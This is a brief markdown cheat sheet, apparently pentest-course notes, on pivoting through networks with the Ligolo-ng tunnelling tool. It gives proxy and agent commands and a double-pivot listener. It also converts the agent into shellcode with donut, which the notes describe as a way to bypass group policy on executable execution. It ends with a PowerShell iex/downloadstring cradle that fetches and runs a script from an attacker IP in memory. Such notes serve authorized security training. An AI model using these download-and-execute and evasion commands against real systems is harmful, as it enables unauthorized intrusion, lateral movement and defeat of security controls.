# Name
Ligolo-ng

## Usage
```
On Kali:
    ./proxy_linux64 -selfcert -laddr 0.0.0.0:443 

    After client connects:
        In Ligolo-ng session: 
            session
            ifconfig
            autoroute
        In event that route already exists, in Kali terminal:
            sudo ip route del 172.16.218.0/24 dev <interface name> 

On pivot machine:
    .\agent_win64.exe -connect 192.168.45.227:443 -ignore-cert

Double pivot:
    In initial ligolo-ng session:
        listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80

ORRRRRRRR Using Ligolo by running shellcode (able to bypass group policy on executable execution)

# Create agent.bin shellcode from agent_win64.exe, specifying the command line
donut -f 1 -o agent.bin -a 2 -p "-connect 192.168.45.206:8000 -ignore-cert" -i agent_win64.exe 

# Change line 14 of ligolo.ps1 to attacker's IP

# Call ligolo.ps1 in memory
iex (new-object net.webclient).downloadstring('http://192.168.45.206/ligolo.ps1')
```

## Source
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.7.5
https://github.com/Extravenger/OSEPlayground?tab=readme-ov-file#tunneling---ligolo-ng
